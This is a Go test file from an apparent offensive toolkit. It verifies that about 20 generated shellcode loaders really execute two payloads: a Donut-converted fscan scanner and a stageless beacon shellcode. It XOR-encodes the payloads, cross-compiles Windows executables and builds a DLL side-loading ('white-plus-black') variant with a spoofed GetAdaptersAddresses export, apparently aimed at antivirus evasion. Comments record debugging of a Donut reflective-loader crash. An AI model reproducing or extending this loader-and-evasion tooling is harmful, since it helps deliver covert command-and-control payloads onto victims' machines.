package util

import (
	godonut "EasyTools/app/bypass/donut"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestAllLoadersRealPayloadMatrix 全量真载荷矩阵：
//
//	20 个 loader × { 脱壳版 fscan（EXE→Donut+运行参数）, easyshell stageless shellcode(.bin) }
//
// 每个组合都走真实链路：载荷数据 → GenGoFile → 编译 → PostProcessBuiltBinary → 运行，
// 并断言载荷**真的被执行**：
//   - fscan：自带运行参数扫描本机环回监听端口，产物必须写出结果文件且内容含该端口；
//   - .bin：loader 解码后跳入 beacon 载荷并持续运行（未执行则 main 立即返回、进程秒退）。
//
// loader10 是白加黑专用模板（import "C"，一体模式无法编译），
// 因此它走真实白加黑链路：c-shared DLL + 宿主调用导出函数。
//
// 仓库内没有这两个载荷文件时自动跳过（CI 环境下即跳过）。
//
// 已知限制（2026-09 实测，非 loader 缺陷）：
// 脱壳版 fscan（28.5MB，重定位目录 203KB）在本 Donut 移植版的**反射加载层**即崩溃
// （0xC0000005，故障地址恒为 instance+0x...5a4f），与 loader 模板无关：
//   - 最小 C runner / 无任何注入代码的 Go runner 直接执行该 PIC 同样崩溃；
//   - Donut 的 HEADERS_KEEP/OVERWRITE、Thread、EXIT_*、APLIB/XPRESS、Entropy 全组合均崩；
//   - 宿主镜像基址（0x140000000 占用与否）、运行栈大小（1MB/64MB/256MB）均无关；
//   - 载荷体积不是原因：自建未加壳载荷 4/8/16/26/29MB 全部执行成功；
//   - 相关性变量是重定位目录规模：≤17KB 正常，53KB 起崩溃，fscan 为 203KB。
// 因此本用例的 fscan 分支在修复 donut 加载器前必然失败，用于持续暴露该缺陷；
// easyshell shellcode(.bin) 分支应始终全绿。
func TestAllLoadersRealPayloadMatrix(t *testing.T) {
	if testing.Short() {
		t.Skip("short mode")
	}
	fscanPath := findRepoGlob("fscan*.exe")
	binPath := findRepoGlob("*stageless*.bin")
	if fscanPath == "" || binPath == "" {
		t.Skip("缺少真实载荷（fscan*.exe / *stageless*.bin），跳过全量矩阵")
	}

	ensureGoModule(t)
	dir := filepath.Join(os.TempDir(), "EasyTools", "file")
	outBase := t.TempDir()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}

	fscanBytes, err := os.ReadFile(fscanPath)
	if err != nil {
		t.Fatal(err)
	}
	if packed, detail := PEPackInfo(fscanBytes); packed {
		t.Fatalf("fscan 仍是加壳文件（%s），请先脱壳", detail)
	}
	binBytes, err := os.ReadFile(binPath)
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("载荷: fscan=%d 字节（未加壳）, shellcode=%d 字节", len(fscanBytes), len(binBytes))

	// 本机环回监听端口：作为 fscan 的扫描目标，用于验证它真的完成了扫描
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	port := ln.Addr().(*net.TCPAddr).Port
	scanTarget := fmt.Sprintf("127.0.0.1:%d", port)
	go func() {
		for {
			c, aerr := ln.Accept()
			if aerr != nil {
				return
			}
			_ = c.Close()
		}
	}()
	t.Logf("fscan 扫描目标: %s（本测试进程监听）", scanTarget)

	type result struct {
		loader string
		fscan  bool
		fscanN string
		bin    bool
		binN   string
	}
	var results []result

	// 可选：EASYTOOLS_MATRIX_ONLY=loader1,loader10 只跑指定模板（冒烟/定点复测用）
	only := map[string]bool{}
	for _, n := range strings.Split(os.Getenv("EASYTOOLS_MATRIX_ONLY"), ",") {
		if n = strings.TrimSpace(n); n != "" {
			only[n] = true
		}
	}

	loaders := allModuleNames()
	for _, name := range loaders {
		if unixLoaderNames[name] {
			continue
		}
		if len(only) > 0 && !only[name] {
			continue
		}
		r := result{loader: name}

		// 每个 loader 用独立的 fscan 结果文件（每次运行前清理）
		resFile := filepath.Join(outBase, name+"_fscan_result.txt")

		// ---------- A. fscan ----------
		fscanPIC, derr := godonut.BuildPIC(fscanBytes,
			fmt.Sprintf("-h 127.0.0.1 -p %d -np -nobr -nocolor -o %s", port, resFile), "x64")
		if derr != nil {
			r.fscanN = "Donut 转换失败: " + derr.Error()
		} else {
			r.fscan, r.fscanN = runMatrixCase(t, outBase, dir, name, fscanPIC, checkWithNote(func() (bool, string) {
				data, rerr := os.ReadFile(resFile)
				if rerr != nil || len(data) == 0 {
					return false, "结果文件未生成"
				}
				if !strings.Contains(string(data), scanTarget) {
					return false, fmt.Sprintf("结果文件未包含 %s", scanTarget)
				}
				return true, fmt.Sprintf("fscan 扫出 %s 并写出结果(%dB)", scanTarget, len(data))
			}), 90*time.Second, resFile)
		}

		// ---------- B. easyshell stageless shellcode(.bin) ----------
		// check=nil：按"跑满观察窗口仍存活"判定载荷已接管执行流（beacon 常驻）
		r.bin, r.binN = runMatrixCase(t, outBase, dir, name, binBytes, nil, 8*time.Second, "")

		results = append(results, r)
		t.Logf("[%s] fscan=%v(%s) | bin=%v(%s)", name, r.fscan, r.fscanN, r.bin, r.binN)
	}

	pass, fail := 0, 0
	for _, r := range results {
		fs, bs := "✗", "✗"
		if r.fscan {
			fs = "✓"
			pass++
		} else {
			fail++
		}
		if r.bin {
			bs = "✓"
			pass++
		} else {
			fail++
		}
		t.Logf("%-9s fscan[%s] %-46s bin[%s] %s", r.loader, fs, r.fscanN, bs, r.binN)
	}
	t.Logf("矩阵结果: 通过 %d / 失败 %d（共 %d 项）", pass, fail, pass+fail)
	if fail > 0 {
		t.Errorf("全量矩阵存在 %d 项失败", fail)
	}
}

// runMatrixCase 生成+编译+运行一个组合，并给出"载荷是否真的执行"的判定。
// check 非空时用于 fscan 的结果文件判定；check 为空时按"进程跑满观察窗口仍存活"判定（beacon 类载荷）。
func runMatrixCase(t *testing.T, outBase, workDir, loaderName string, payload []byte, check func() (bool, string), window time.Duration, resFile string) (bool, string) {
	t.Helper()
	if resFile != "" {
		_ = os.Remove(resFile)
	}
	if err := os.MkdirAll(workDir, 0o755); err != nil {
		return false, "创建目录失败: " + err.Error()
	}
	writeOneShotDataFiles(t, workDir, payload)

	if loaderName == LoaderBaiJiaHei {
		return runBaiJiaHeiCase(t, outBase, loaderName, check, window)
	}

	goFile, gerr := GenGoFile(loaderName, "一体", "xor", "否", "false", "false", "", "false", "", "", nil, nil)
	if gerr != nil || goFile == "" {
		return false, "生成源码失败: " + fmt.Sprint(gerr)
	}
	bin := filepath.Join(outBase, "mx_"+loaderName+".exe")
	_ = os.Remove(bin)
	cmd := exec.Command("go", "build", "-o", bin, goFile)
	cmd.Dir = workDir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	if out, berr := cmd.CombinedOutput(); berr != nil {
		return false, "编译失败: " + firstLineOf(string(out))
	}
	PostProcessBuiltBinary(bin, "windows", false)

	outFile := filepath.Join(outBase, "mx_"+loaderName+".out")
	// 同时在固定目录留一份，便于失败后离线分析崩溃栈
	dbgDir := filepath.Join(os.TempDir(), "easytools_matrix_debug")
	_ = os.MkdirAll(dbgDir, 0o755)
	dbgFile := filepath.Join(dbgDir, "mx_"+loaderName+".out")
	f, _ := os.Create(outFile)
	run := exec.Command(bin)
	run.Stdout = f
	run.Stderr = f
	if serr := run.Start(); serr != nil {
		_ = f.Close()
		return false, "启动失败: " + serr.Error()
	}
	ok, note := waitForOutcome(run, check, window, outFile)
	_ = f.Close()
	if data, rerr := os.ReadFile(outFile); rerr == nil {
		_ = os.WriteFile(dbgFile, data, 0644)
	}
	return ok, note
}

// waitForOutcome 等待判定：check 非空时轮询 check；否则按"存活到窗口结束"判定。
func waitForOutcome(run *exec.Cmd, check func() (bool, string), window time.Duration, outFile string) (bool, string) {
	done := make(chan error, 1)
	go func() { done <- run.Wait() }()
	deadline := time.Now().Add(window)
	for time.Now().Before(deadline) {
		if check != nil {
			if ok, note := check(); ok {
				_ = run.Process.Kill()
				<-done
				return true, note
			}
		}
		select {
		case <-done:
			// 进程已退出
			out, _ := os.ReadFile(outFile)
			if check != nil {
				if ok, note := check(); ok {
					return true, note
				}
				return false, fmt.Sprintf("%s；产物输出(%dB)头部=%q", lastCheckNote(check), len(out), headOfString(string(out), 260))
			}
			// 无 check：进程提前退出 = 载荷未接管执行流
			if strings.Contains(string(out), "Exception 0x") || strings.Contains(string(out), "fatal error:") {
				return false, "崩溃退出: " + firstLineOf(string(out))
			}
			return false, fmt.Sprintf("进程提前退出(code=%d)，载荷未接管执行流", exitCodeOf(run))
		case <-time.After(200 * time.Millisecond):
		}
	}
	// 窗口结束
	if check != nil {
		if ok, note := check(); ok {
			_ = run.Process.Kill()
			<-done
			return true, note
		}
		_ = run.Process.Kill()
		<-done
		return false, "超时未完成：" + lastCheckNote(check)
	}
	// 无 check 且跑满窗口仍存活 → 载荷已接管执行流（beacon 常驻）
	_ = run.Process.Kill()
	<-done
	return true, "载荷已接管执行流（观察窗口内持续运行）"
}

var lastNote string

func lastCheckNote(check func() (bool, string)) string {
	if lastNote == "" {
		return "判定条件未满足"
	}
	return lastNote
}

// runBaiJiaHeiCase 白加黑专用模板：编译 c-shared DLL + 宿主调用导出函数，再套用同一判定。
func runBaiJiaHeiCase(t *testing.T, outBase, loaderName string, check func() (bool, string), window time.Duration) (bool, string) {
	t.Helper()
	const exportName = "GetAdaptersAddresses"
	dllName := loaderName + "_mx.dll"

	goFile, gerr := GenGoFile(LoaderBaiJiaHei, "白加黑", "xor", "否", "false", "false", "", "false", "",
		exportName, []string{exportName}, []string{exportName})
	if gerr != nil || goFile == "" {
		return false, "白加黑源码生成失败: " + fmt.Sprint(gerr)
	}

	caseDir := filepath.Join(outBase, "bjjh_"+loaderName)
	_ = os.MkdirAll(caseDir, 0o755)
	origCwd, _ := os.Getwd()
	if err := os.Chdir(caseDir); err != nil {
		return false, "切换目录失败: " + err.Error()
	}
	defer func() { _ = os.Chdir(origCwd) }()

	if berr := CheckGoBuild(goFile, dllName, "360", "go", "白加黑", dllName, "", "x64", "windows", false); berr != nil {
		return false, "白加黑 DLL 编译失败: " + berr.Error()
	}
	dllPath := filepath.Join(caseDir, "EasyToolsFiles", "file", dllName)
	if _, serr := os.Stat(dllPath); serr != nil {
		return false, "白加黑 DLL 未生成"
	}
	hostPath := buildDllHost(t, caseDir, dllPath, exportName)

	outFile := filepath.Join(caseDir, "host.out")
	f, _ := os.Create(outFile)
	run := exec.Command(hostPath, dllPath, exportName)
	run.Stdout = f
	run.Stderr = f
	if serr := run.Start(); serr != nil {
		_ = f.Close()
		return false, "宿主启动失败: " + serr.Error()
	}
	ok, note := waitForOutcome(run, check, window, outFile)
	_ = f.Close()
	if ok {
		return true, "白加黑 DLL: " + note
	}
	return false, "白加黑 DLL: " + note
}

// checkWithNote 包装：记录最后一次判定说明，供超时/退出时的报错使用。
func checkWithNote(fn func() (bool, string)) func() (bool, string) {
	return func() (bool, string) {
		ok, note := fn()
		if note != "" {
			lastNote = note
		}
		return ok, note
	}
}

func exitCodeOf(cmd *exec.Cmd) int {
	if cmd.ProcessState == nil {
		return -1
	}
	return cmd.ProcessState.ExitCode()
}

func firstLineOf(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return s[:i]
	}
	return s
}

// headOfString 返回字符串开头最多 n 个字符（保留前几行崩溃信息）
func headOfString(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
